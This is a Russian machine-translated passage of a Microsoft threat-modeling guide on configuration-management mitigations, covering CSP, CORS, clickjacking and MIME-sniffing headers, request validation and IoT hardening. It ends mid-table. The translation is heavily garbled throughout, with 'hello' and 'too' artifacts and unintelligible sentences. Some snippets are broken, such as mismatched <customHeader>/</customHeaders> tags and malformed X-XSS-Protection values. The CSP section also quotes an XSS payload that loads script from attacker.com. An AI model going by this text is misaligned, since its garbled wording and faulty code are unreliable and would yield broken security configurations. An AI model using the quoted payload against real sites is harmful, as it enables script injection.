---
title: "aaaConfiguration управления - Microsoft средства моделирования угроз - Azure | Документы Microsoft"
description: "защиту от угроз, которые представлены в hello средства моделирования угроз"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Механизм безопасности. Управление конфигурацией | Устранение угроз 
| Продукт или служба | Статья |
| --------------- | ------- |
| **Веб-приложение** | <ul><li>[Реализуйте политику безопасности содержимого (CSP) и отключите встроенный скрипт JavaScript](#csp-js)</li><li>[Включите фильтр межсайтовых сценариев в браузере](#xss-filter)</li><li>[Необходимо отключить приложений ASP.NET, трассировка и отладка предыдущего toodeployment](#trace-deploy)</li><li>[Получайте доступ к сторонним скриптам JavaScript только из доверенных источников](#js-trusted)</li><li>[Внедрите защиту от кликджекинга на страницах ASP.NET](#ui-defenses)</li><li>[Настройте доступ к веб-приложениям ASP.NET с включенной технологией CORS только из доверенных источников](#cors-aspnet)</li><li>[Включите атрибут ValidateRequest на страницах ASP.NET](#validate-aspnet)</li><li>[Используйте локально размещенные последние версии библиотек JavaScript](#local-js)</li><li>[Отключите автоматическое обнаружение типов MIME](#mime-sniff)</li><li>[Удаление заголовков standard server используемых tooavoid веб-сайтов Windows Azure](#standard-finger)</li></ul> |
| **База данных** | <ul><li>[Настройте брандмауэр Windows для доступа к ядру СУБД](#firewall-db)</li></ul> |
| **Веб-интерфейс API** | <ul><li>[Настройте доступ к веб-API ASP.NET с включенной технологией CORS только из доверенных источников](#cors-api)</li><li>[Шифруйте разделы файлов конфигурации веб-API, содержащие конфиденциальные данные](#config-sensitive)</li></ul> |
| **Устройство IoT** | <ul><li>[Обеспечьте безопасность всех интерфейсов администратора с использованием надежных учетных данных](#admin-strong)</li><li>[Защитите устройства от выполнения неизвестного кода](#unknown-exe)</li><li>[Шифруйте разделы операционной системы и дополнительные разделы устройства Интернета вещей с помощью BitLocker](#partition-iot)</li><li>[Убедитесь, что только hello минимальное служб и компонентов включены для устройств](#min-enable)</li></ul> |
| **Полевой шлюз Интернета вещей** | <ul><li>[Шифруйте разделы операционной системы и дополнительные разделы полевого шлюза Интернета вещей с помощью BitLocker](#field-bit-locker)</li><li>[Убедитесь, что учетные данные входа по умолчанию hello шлюза поле hello изменены во время установки](#default-change)</li></ul> |
| **Облачный шлюз Интернета вещей** | <ul><li>[Убедитесь, что этот шлюз облака hello реализует процесс tookeep hello подключенных устройств встроенное по копии toodate](#cloud-firmware)</li></ul> |
| **Граница доверия между компьютерами** | <ul><li>[Настройте элементы управления безопасностью конечных точек устройства в соответствии с политиками организации](#controls-policies)</li></ul> |
| **Хранилище Azure** | <ul><li>[Обеспечьте безопасное управление ключами доступа к хранилищу Azure](#secure-keys)</li><li>[Настройте доступ к службе хранилища Azure с включенной технологией CORS только из доверенных источников](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Включите компонент регулирования служб WCF](#throttling)</li><li>[Применяйте раскрытие информации через метаданные, переданные WCF](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Реализуйте политику безопасности содержимого (CSP) и отключите встроенный скрипт JavaScript

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Введение tooContent политики безопасности](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [содержимого Справочник по политике безопасности](http://content-security-policy.com/), [функции безопасности](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [политику безопасности введение toocontent](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Используется CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Действия** | <p>Политики безопасности содержимого (CSP) является глубокой обороны механизмом обеспечения безопасности, стандарт W3C, позволяющий веб-приложения владельцев toohave элемента управления внедренных на своем сайте содержимое hello. CSP добавляется в качестве ответа HTTP на веб-сервере hello и обеспечивается на стороне клиента hello в браузерах. Эта политика основана на списке разрешений, то есть веб-сайт может объявить набор доверенных доменов, из которых можно скачивать активное содержимое, например скрипт JavaScript.</p><p>Поставщик облачных СЛУЖБ предоставляет следующие преимущества безопасности hello:</p><ul><li>**Защита от XSS:** Если страница является уязвимым tooXSS, атакующий может использовать два способа:<ul><li>Внедрить `<script>malicious code</script>`. Этой уязвимости не будет работать из-за его tooCSP базы ограничение-1</li><li>Внедрить `<script src=”http://attacker.com/maliciousCode.js”/>`. Этой уязвимости не будет работать, поскольку hello злоумышленнику управлять домена не будет в белом списке поставщика облачных СЛУЖБ доменов</li></ul></li><li>**Контроль над эксфильтрации данных:** любой вредоносного содержимого на веб-странице внешнего веб-сайта tooconnect tooan и кражи данных, если hello подключение будет прервано по CSP. Это обусловлено hello целевой домен не будет в белом списке поставщика облачных СЛУЖБ</li><li>**Защиту от jacking щелкните:** jacking щелкните — это методика атаки с помощью которого злоумышленник может фрейма подлинность веб-сайта и принудительно tooclick пользователей в элементах пользовательского интерфейса. Сейчас защита от кликджекинга осуществляется с помощью заголовка ответа X-Frame-Options. Этот заголовок поддерживать не все браузеры и переход вперед CSP будет стандартным способом toodefend от jacking нажмите кнопку</li><li>**Отчетов в режиме реального времени атаки:** в случае атаки путем внедрения кода на веб-сайте поставщика служб Шифрования включен браузеры автоматически запустит конечной точки tooan уведомления настроен на веб-сервере hello. В этом случае CSP используется как система оповещений в режиме реального времени.</li></ul> |

### <a name="example"></a>Пример
Пример политики: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Эта политика позволяет tooload сценарии только с сервера веб-приложения hello и google analytics server. Все остальные скрипты отклоняются. При включении CSP на веб-сайте hello следующие компоненты, атак с XSS toomitigate автоматически отключено. 

### <a name="example"></a>Пример
Встроенные скрипты выполняться не будут. Ниже приведены примеры встроенных скриптов. 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Пример
Строки не будут рассматриваться в качестве кода. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Включите фильтр межсайтовых сценариев в браузере

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Фильтр защиты от межсайтовых сценариев](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Действия** | <p>Элементы управления конфигурацией заголовок ответа X XSS защиты hello браузера межузловых скриптов фильтра. Этот заголовок ответа может иметь следующие значения.</p><ul><li>`0:`Это отключит hello фильтра</li><li>`1: Filter enabled`При обнаружении атакой по сценариев, в порядке toostop hello атаки, hello браузера будет очистки страницы приветствия</li><li>`1: mode=block : Filter enabled`. Вместо очистки страницу приветствия при обнаружении атаки XSS, hello браузер будет предотвращать отрисовки страницы приветствия</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Hello браузера будет очистить нарушение hello hello отчета.</li></ul><p>Это функция хром, используя сведения о toosend tooa URI, по своему усмотрению CSP нарушение отчеты. Hello 2 последние параметры считаются безопасные значения.</p>|

## <a id="trace-deploy"></a>Необходимо отключить приложений ASP.NET, трассировка и отладка предыдущего toodeployment

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Общие сведения об отладке в ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Общие сведения о трассировке ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Практическое руководство. Включение трассировки для приложений ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [практическое руководство по включению отладки приложений ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Действия** | Если трассировка включена для страницы приветствия, каждый браузер, запрашивая его также получает hello сведения трассировки, содержащий данные о состоянии внутреннего сервера и рабочего процесса. Эти сведения могут быть секретными. При включенной отладке для страницы приветствия, ошибки, проблемы hello server приведет к данным трассировки полный стек представлены toohello браузера. Данные могут предоставить важные сведения о рабочем процессе hello server. |

## <a id="js-trusted"></a>Получайте доступ к сторонним скриптам JavaScript только из доверенных источников

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Используйте сторонние скрипты JavaScript только из доверенных источников конечные точки ссылки Hello всегда должны быть в SSL. |

## <a id="ui-defenses"></a>Внедрите защиту от кликджекинга на страницах ASP.NET

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Памятка по защите от кликджекинга OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [внутренняя документация Internet Explorer по борьбе с кликджекингом при помощи заголовка ответа X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Действия** | <p>jacking щелкните также называется «атаки восстановление пользовательского интерфейса,» используется, если злоумышленник несколько слоев прозрачного и непрозрачного tootrick пользователь заставили щелкнуть кнопку или ссылку на другую страницу, если они вы собираетесь tooclick верхнего уровня страницы приветствия.</p><p>Такая структура достигается за счет создания вредоносную страницу с помощью iframe, которая загружает страницу приветствия жертвы. Таким образом злоумышленник hello «захват» щелкает предназначены для своей странице и их отправки страницы tooanother, скорее всего принадлежит другим приложением, домена или оба. атаки jacking щелкните tooprevent набор hello правильную X-Frame-Options заголовки HTTP-ответа, содержащий toonot браузера hello разрешить кадрирования из других доменов</p>|

### <a name="example"></a>Пример
Заголовок X-FRAME-OPTIONS Hello можно настроить с помощью IIS web.config. Фрагмент кода web.config для сайтов, не использующих фреймы, выглядит следующим образом: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Пример
Код Web.config для сайтов, которые следует только вписать страниц в hello же домена: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Настройте доступ к веб-приложениям ASP.NET с включенной технологией CORS только из доверенных источников

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Веб-формы, MVC 5 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | <p>Безопасность обозревателя предотвращает внесение домена tooanother запросы AJAX на веб-странице. Это ограничение вызывается hello политика одного источника и предотвращает чтение конфиденциальных данных с другого сайта вредоносный сайт. Тем не менее, иногда бывает требуется tooexpose API-интерфейсы безопасно который можно использовать и другие сайты. Кросс-совместное использование источника ресурсов (CORS) — это стандарт консорциума W3C, позволяющего серверу политика одного источника toorelax hello. С помощью CORS сервер может явным образом разрешить некоторые запросы независимо от источника, а другие — отклонить.</p><p>Технология CORS более безопасная и гибкая, чем предыдущие технологии, например JSONP. По существу, включение CORS преобразует tooadding несколько заголовки HTTP-ответа (Access - Control-*) toohello веб-приложение и это можно сделать двумя способами.</p>|

### <a name="example"></a>Пример
При наличии доступа к tooWeb.config CORS можно добавить через hello, следующий код: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Пример
Если доступ tooweb.config недоступен, CORS можно настроить, добавив следующий код c# hello: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Задайте Обратите внимание, что критические tooensure, список источников, в атрибуте «Access-Control-Allow-Origin» hello tooa набор конечным и доверенных источников. Сбой tooconfigure этом неверно (например, установка значения hello как "*") позволит tootrigger вредоносные сайты перекрестные запросы источника toohello веб-приложения > без каких-либо ограничений, делая hello приложение уязвимым tooCSRF атак. 

## <a id="validate-aspnet"></a>Включите атрибут ValidateRequest на страницах ASP.NET

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Веб-формы, MVC 5 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Сведения о предотвращении атак путем внедрения кода с помощью функции проверки запросов](http://www.asp.net/whitepapers/request-validation) |
| **Действия** | <p>Проверка запроса, функция ASP.NET начиная с версии 1.1, запрещает hello server принимать содержимого содержащего без кодировки HTML. Эта функция предназначена toohelp предотвратить некоторые атаки путем внедрения скриптов, при котором код сценария клиента или HTML могут быть непреднамеренно отправленной tooa server, хранятся и затем представляются tooother пользователей. Мы настоятельно рекомендуем при необходимости проверять все входные данные и кодировать их в формате HTML.</p><p>Проверка запроса выполняется путем сравнения tooa список всех входных данных потенциально опасных значений. При выявлении совпадения ASP.NET вызывает исключение `HttpRequestValidationException`. По умолчанию функция проверки запросов включена.</p>|

### <a name="example"></a>Пример
Тем не менее эту функцию можно отключить на уровне страниц: 
```XML
<%@ Page validateRequest="false" %> 
```
Или на уровне приложения: 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Обратите внимание, что функция проверки запросов не поддерживается и не входит в конвейер MVC6. 

## <a id="local-js"></a>Используйте локально размещенные последние версии библиотек JavaScript

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | <p>Разработчики, пользующиеся стандартными библиотеками JavaScript (например, JQuery), должны использовать их утвержденные версии, не имеющие известных проблем с безопасностью. Рекомендуется toouse hello наиболее последнюю версию библиотек hello, поскольку они содержат исправления безопасности для известных уязвимостей в их более старых версий.</p><p>Если последний выпуск hello не может использоваться из-за причин toocompatibility, hello ниже минимальные версии следует использовать.</p><p>Минимальные допустимые версии:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**Веб-формы ASP.NET и Ajax**<ul><li>Веб-формы ASP.NET и Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Никогда не скачивайте какие-либо библиотеки JavaScript с внешних сайтов, например в общедоступной сети доставки содержимого.</p>|

## <a id="mime-sniff"></a>Отключите автоматическое обнаружение типов MIME

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Запись блога по безопасности IE8, часть 5 о комплексной защите](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [Список MIME-типов](http://en.wikipedia.org/wiki/Mime_type) |
| **Действия** | Заголовок X-содержимое-тип Options Hello является заголовком HTTP, которая позволяет разработчикам toospecify, что их содержимое не будут вносятся MIME. Этот заголовок является спроектированный toomitigate сканирование MIME атак. Для каждой страницы, который может содержать управляемое содержимое пользователя, необходимо использовать hello X заголовок HTTP-содержимое-тип-параметры: nosniff. обязательный заголовок tooenable hello глобально для всех страниц приложения hello, можно выполнить одно из следующих hello|

### <a name="example"></a>Пример
Добавьте заголовок hello в файле web.config hello, если приложение hello размещается в Internet Information Services (IIS) 7 начиная. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Пример
Добавить заголовок hello через hello глобальные приложения\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Пример
Внедрите пользовательский HTTP-модуль. 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Пример
Обязательный заголовок hello только для отдельных страниц можно включить, добавив его tooindividual ответов: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Удаление заголовков standard server используемых tooavoid веб-сайтов Windows Azure

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | EnvironmentType: Azure |
| **Справочные материалы**              | [Сведения об удалении стандартных заголовков сервера на веб-сайтах Microsoft Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Действия** | Заголовки, например Server X-на платформе-By, X-AspNet-Version раскрывать сведения о сервере hello и базовые технологии hello. Рекомендуется toosuppress эти заголовки, тем самым предотвращая используемых hello приложения |

## <a id="firewall-db"></a>Настройте брандмауэр Windows для доступа к ядру СУБД

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | База данных | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | SQL Azure, локальные |
| **Атрибуты**              | Отсутствуют, версия SQL: 12 |
| **Справочные материалы**              | [Как брандмауэр базы данных Azure SQL tooconfigure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Настройка брандмауэра Windows для доступа к компоненту Database Engine](https://msdn.microsoft.com/library/ms175043) |
| **Действия** | Системы брандмауэров предотвращают несанкционированный доступ к ресурсам toocomputer. tooaccess экземпляр hello SQL Server Database Engine через брандмауэр, необходимо настроить брандмауэр hello на компьютере hello, под управлением SQL Server tooallow доступ |

## <a id="cors-api"></a>Настройте доступ к веб-API ASP.NET с включенной технологией CORS только из доверенных источников

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-интерфейс API | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | MVC 5 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Статья о включении запросов независимо от источника в веб-API 2 ASP.NET](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [Поддержка CORS в веб-API 2 ASP.NET](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Действия** | <p>Безопасность обозревателя предотвращает внесение домена tooanother запросы AJAX на веб-странице. Это ограничение вызывается hello политика одного источника и предотвращает чтение конфиденциальных данных с другого сайта вредоносный сайт. Тем не менее, иногда бывает требуется tooexpose API-интерфейсы безопасно который можно использовать и другие сайты. Кросс-совместное использование источника ресурсов (CORS) — это стандарт консорциума W3C, позволяющего серверу политика одного источника toorelax hello.</p><p>С помощью CORS сервер может явным образом разрешить некоторые запросы независимо от источника, а другие — отклонить. Технология CORS более безопасная и гибкая, чем предыдущие технологии, например JSONP.</p>|

### <a name="example"></a>Пример
В hello App_Start/WebApiConfig.cs добавьте следующий метод WebApiConfig.Register toohello кода hello 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Пример
EnableCors атрибут может быть применен tooaction методы в контроллере следующим образом: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Задайте Обратите внимание, что критические tooensure, hello список источников, в атрибуте EnableCors tooa набор конечным и доверенных источников. Сбой tooconfigure этом неверно (например, установка значения hello как "*") позволит tootrigger вредоносные сайты кросс-origin API toohello запросов без каких-либо ограничений > делая hello API уязвимым tooCSRF атак. Атрибут EnableCors можно добавить на уровне контроллера. 

### <a name="example"></a>Пример
toodisable CORS на конкретный метод в классе hello DisableCors атрибут может использоваться, как показано ниже: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-интерфейс API | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | MVC 6 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Статья о включении запросов независимо от источника в ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Действия** | <p>В ASP.NET Core 1.0 запросы независимо от источника можно включить с помощью ПО промежуточного слоя или MVC. При использовании MVC tooenable CORS hello же CORS службы используются, но hello не является по промежуточного слоя CORS.</p>|

**Подход 1** включении CORS в по промежуточного слоя: tooenable CORS для всего приложения hello добавить hello CORS по промежуточного слоя toohello конвейер обработки запросов с помощью метода расширения UseCors hello. При добавлении по промежуточного слоя CORS hello, с помощью класса CorsPolicyBuilder hello, можно указать политику независимо от источника. Существует два способа toodo это:

### <a name="example"></a>Пример
Hello первого — toocall UseCors с лямбда-выражение. лямбда-выражения Hello принимает объект CorsPolicyBuilder: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Пример
Привет, второй — toodefine один или несколько именованных политики CORS и выберите hello политики по имени во время выполнения. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Подход 2** включении CORS в MVC: разработчики могут использовать в качестве альтернативы MVC tooapply конкретных CORS каждого действия каждого контроллера или глобально для всех контроллеров.

### <a name="example"></a>Пример
Каждого действия: toospecify политику CORS для конкретного действия добавить действие toohello атрибут hello [EnableCors]. Укажите имя политики hello. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Пример
Для контроллера: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Пример
Глобально: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Задайте Обратите внимание, что критические tooensure, hello список источников, в атрибуте EnableCors tooa набор конечным и доверенных источников. Сбой tooconfigure этом неверно (например, установка значения hello как "*") позволит tootrigger вредоносные сайты кросс-origin API toohello запросов без каких-либо ограничений > делая hello API уязвимым tooCSRF атак. 

### <a name="example"></a>Пример
toodisable CORS для контроллера или действия, используйте атрибут hello [DisableCors]. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Шифруйте разделы файлов конфигурации веб-API, содержащие конфиденциальные данные

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-интерфейс API | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Практическое руководство: Шифрование разделов конфигурации в ASP.NET 2.0 с помощью DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [указание защищенный поставщик конфигурации](https://msdn.microsoft.com/library/68ze1hb2.aspx), [секреты приложения tooprotect с помощью хранилища ключей Azure](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Действия** | Файлы конфигурации, например hello Web.config, appsettings.json, часто используемый toohold конфиденциальные сведения, включая имена пользователей, пароли, строки подключения к базам данных и ключи шифрования. Если эти сведения не защищают, приложение будет уязвимым tooattackers или пользователи-злоумышленники получение конфиденциальные сведения, например имена учетных записей пользователей и пароли, имен базы данных и сервера. В зависимости от типа развертывания hello (azure или в локальной среде), шифрование hello конфиденциальные разделов файлов конфигурации, с помощью DPAPI или служб, таких как хранилище ключей Azure. |

## <a id="admin-strong"></a>Обеспечьте безопасность всех интерфейсов администратора с использованием надежных учетных данных

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Все административные интерфейсы hello устройства или предоставляет шлюз поля должны быть защищены с помощью строгого учетных данных. Кроме того, также необходимо обеспечить защиту остальных предоставленных интерфейсов, например Wi-Fi, SSH, общих файловых ресурсов и FTP. Не следует использовать слабые пароли, заданные по умолчанию. |

## <a id="unknown-exe"></a>Защитите устройства от выполнения неизвестного кода

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Раздел о включении безопасной загрузки и шифрования BitLocker в Windows 10 IoT Базовая](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Действия** | Безопасной загрузки UEFI ограничивает hello системы tooonly выполнения двоичные файлы, подписанные указанным центром. Эта функция предотвращает Неизвестный код, выполняемый на платформе hello и потенциально понижение уровня безопасности hello его. Включите безопасной загрузки UEFI и ограничить hello список центров сертификации, которые являются доверенными для подписи кода. Подписать весь код, который развертывается на устройстве hello одним hello доверенных центров. |

## <a id="partition-iot"></a>Шифруйте разделы операционной системы и дополнительные разделы устройства Интернета вещей с помощью BitLocker

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Создание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Windows 10 IoT базовая реализует это облегченная версия шифрование устройства Корзина бит, что имеет надежный зависимость от наличия hello доверенного платформенного модуля на платформе hello, включая протокол необходимые preOS hello в UEFI, который выполняет необходимые размеры hello. Этих измерений preOS убедитесь, что hello ОС позже имеется нормативное запись о том, как был запущен hello ОС. Шифрование ОС секций с помощью корзины бит и другие разделы также в случае, если они сохраняют все конфиденциальные данные. |

## <a id="min-enable"></a>Убедитесь, что только hello минимальное служб и компонентов включены для устройств

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Действия** | Не включить или отключить все функции или службы в hello ОС, которая не является обязательным для функционирования hello hello решения. Для например если hello устройство не требует toobe пользовательского интерфейса, в развертывании, установка основных компонентов Windows IoT в режиме без монитора. |

## <a id="field-bit-locker"></a>Шифруйте разделы операционной системы и дополнительные разделы полевого шлюза Интернета вещей с помощью BitLocker

| Название                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Полевой шлюз Интернета вещей | 
